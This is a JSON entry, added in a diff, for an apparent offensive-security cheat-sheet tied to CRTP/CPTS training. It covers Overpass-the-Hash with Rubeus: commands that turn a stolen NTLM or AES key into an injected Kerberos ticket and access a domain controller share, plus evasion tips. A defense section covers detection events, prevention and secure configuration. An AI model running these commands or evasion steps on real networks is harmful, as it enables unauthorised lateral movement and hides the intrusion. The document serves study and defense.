@@ -1,0 +1,108 @@
+{
+  "id": "crtp-overpass-hash",
+  "name": "Overpass-the-Hash / Pass-the-Key (Rubeus asktgt)",
+  "command": "Rubeus.exe asktgt /user:<user> /rc4:<nt_hash> /domain:<domain> /ptt /opsec",
+  "description": "Convert an NTLM hash into a Kerberos TGT using Rubeus. Enables Kerberos-based lateral movement without needing plaintext credentials.",
+  "platform": "windows",
+  "category": "Active Directory",
+  "subcategory": "Lateral Movement",
+  "type": "command",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "source": "CRTP",
+  "opsec": "quiet",
+  "mitre": [
+    "T1550.002",
+    "T1558.001"
+  ],
+  "tools": [
+    "Rubeus"
+  ],
+  "tags": [
+    "overpass-hash",
+    "pth",
+    "kerberos",
+    "rubeus",
+    "tgt",
+    "asktgt"
+  ],
+  "steps": [
+    {
+      "label": "Request TGT with NTLM hash",
+      "command": "Rubeus.exe asktgt /user:<user> /rc4:<nt_hash> /domain:<domain> /ptt /opsec"
+    },
+    {
+      "label": "Verify injected ticket",
+      "command": "klist"
+    },
+    {
+      "label": "Access target",
+      "command": "dir \\\\<dc_host>\\C$"
+    }
+  ],
+  "examples": [
+    {
+      "label": "Overpass-the-hash with /opsec",
+      "command": "Rubeus.exe asktgt /user:jdoe /rc4:<nt_hash> /domain:corp.local /ptt /opsec"
+    },
+    {
+      "label": "Use AES256 key (quieter)",
+      "command": "Rubeus.exe asktgt /user:jdoe /aes256:<aes256_key> /domain:corp.local /ptt /opsec"
+    },
+    {
+      "label": "Verify injected tickets",
+      "command": "klist"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "crtp-credential-dumping",
+      "note": "Dump NTLM hash first",
+      "rel": "prereq"
+    },
+    {
+      "id": "crtp-psremoting",
+      "note": "Use injected Kerberos ticket for PS Remoting",
+      "rel": "next"
+    },
+    {
+      "id": "crtp-dcsync",
+      "note": "DCSync with obtained DA TGT",
+      "rel": "next"
+    },
+    {
+      "id": "rubeus-ptt",
+      "note": "CPTS Rubeus PTT card",
+      "rel": "alternative"
+    }
+  ],
+  "notes": "/opsec generates RC4 AS-REQ but uses AES for the session key \u2014 less suspicious. Prefer AES key if available.",
+  "references": [
+    {
+      "title": "CRTP - Overpass the Hash",
+      "url": "https://www.alteredsecurity.com/adlab"
+    },
+    {
+      "title": "HackTricks - Overpass the Hash",
+      "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/over-pass-the-hash-pass-the-key"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Overpass-the-Hash (also called Pass-the-Key) converts an NTLM hash or AES Kerberos key into a fully valid Kerberos TGT using the AS-REQ/AS-REP exchange. Rubeus asktgt takes the hash and requests a TGT from the KDC \u2014 which is then injected into the current session via klist or loaded by Rubeus. Unlike PtH (which sends the hash in NTLM challenge-response), OPtH produces a legitimate Kerberos ticket that works everywhere NTLM would be blocked.",
+    "prerequisites": "An NTLM hash or AES Kerberos key (from LSASS dump or DCSync). Rubeus or Mimikatz. Network access to DC on port 88 (Kerberos). Target account's SPN or service must accept Kerberos authentication.",
+    "impact": "T1550.002 Use Alternate Authentication Material: Pass the Hash + T1558.001 Golden Ticket. Impersonates the target user with a valid Kerberos ticket \u2014 full access to resources that account can reach. Particularly powerful for DA accounts dumped via DCSync.",
+    "detection": "Event 4768 (TGT request) from a workstation/server that doesn't normally request TGTs for that account (anomalous Kerberos AS-REQ source). RC4 encryption type in TGT request when AES is expected (Rubeus with /rc4 flag). MDI: 'Suspected overpass-the-hash attack'. Sysmon Event 10 if combined with LSASS dump. New TGT issued for a DA account from an unexpected host.\nStolen Kerberos tickets or token impersonation: logon sessions from accounts without expected interactive logon events (DET0338/AN0954).\nAccess tokens or SSH keys used without corresponding login shell or PAM module activity, especially for remote execution (AN0955).\nToken replay or impersonation in federated logins without interactive browser session or MFA prompts (AN0956).\nOAuth token reuse from different geographic regions without full login events (AN0957).\nContainer process using mounted cloud credentials or token cache without known orchestration (AN0958).\nAccess token reuse for SharePoint or Outlook APIs without interactive user context (AN0959).\nInstance metadata token use across instances or misuse of short-lived tokens for different roles (AN0960).",
+    "artifacts": "Event 4768: TGT request for privileged account from unexpected host | MDI alert: 'Suspected overpass-the-hash attack' | Event 4624 logon type 3 or 9 from new source | SIEM: DA Kerberos AS-REQ from workstation",
+    "prevention": "Credential Guard prevents NTLM hash extraction from LSASS. Protected Users group: tickets can't be delegated and use AES-only (RC4 OPtH fails). Enable AES-only Kerberos on sensitive accounts (Set-ADUser -KerberosEncryptionType AES256). MDI deployment. Require DA accounts to logon only from PAWs \u2014 anomalous TGT source detected by SIEM.\nAccount Use Policies: Restrict authentication material use outside expected contexts.\nActive Directory Configuration: Configure AD to prevent certain techniques; use SID Filtering.\nApplication Developer Guidance: Implement token binding (Azure AD token protection, OAuth DPoP/Proof of Possession) to cryptographically bind tokens.\nAudit: Scan for insecure configurations and potential weaknesses.\nPassword Policies: Set and enforce secure password policies.\nPrivileged Account Management: Limit credential overlap across systems to reduce lateral movement risk.\nUser Account Management: Enforce least privilege; prevent domain users from being local admins on multiple systems.",
+    "evasion": "Use /aes256 flag with AES key instead of RC4 hash \u2014 blends with normal AES Kerberos traffic. Inject ticket into a process rather than the current logon session to avoid event correlation. Use from a PAW-adjacent host to avoid source-IP anomaly detection.",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1550/002/",
+      "https://attack.mitre.org/techniques/T1558/001/"
+    ],
+    "misconfiguration": "Credential Guard not enabled. Protected Users group not used for DA accounts. RC4 encryption not restricted. No monitoring of DA account TGT requests from unexpected sources. LSASS PPL disabled (allows hash extraction prerequisite).",
+    "vulnerable_config": "# Credential Guard NOT enabled:\n(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard').EnableVirtualizationBasedSecurity\n# Returns 0 or $null = VBS/Credential Guard disabled = NTLM hashes extractable from LSASS\n\n# Protected Users NOT used for DAs:\nGet-ADGroupMember 'Protected Users' | Select-Object Name\n# DA accounts not in Protected Users \u2192 NTLM hashes delegatable",
+    "secure_config": "# Enable Credential Guard:\n# Computer Config \u2192 Admin Templates \u2192 System \u2192 Device Guard\n# \u2192 Turn On Virtualization Based Security: Enabled\n# \u2192 Credential Guard Configuration: Enabled with UEFI lock\n\n# Add all DA accounts to Protected Users:\nGet-ADGroupMember 'Domain Admins' | ForEach-Object {\n  Add-ADGroupMember 'Protected Users' $_.distinguishedName\n}\n# Protected Users: no NTLM, no RC4 Kerberos, no delegation, no cached creds\n\n# Force AES-only Kerberos for sensitive accounts:\nSet-ADUser DomainAdmin1 -KerberosEncryptionType AES256\n\n# SIEM alert:\n# EventID=4768 AND TicketOptions=0x40800010 (forwardable+renewable+canonicalize)\n# AND ServiceName=krbtgt AND ClientAddress NOT IN (known PAW IPs for DA) \u2192 ALERT"
+  }
+}
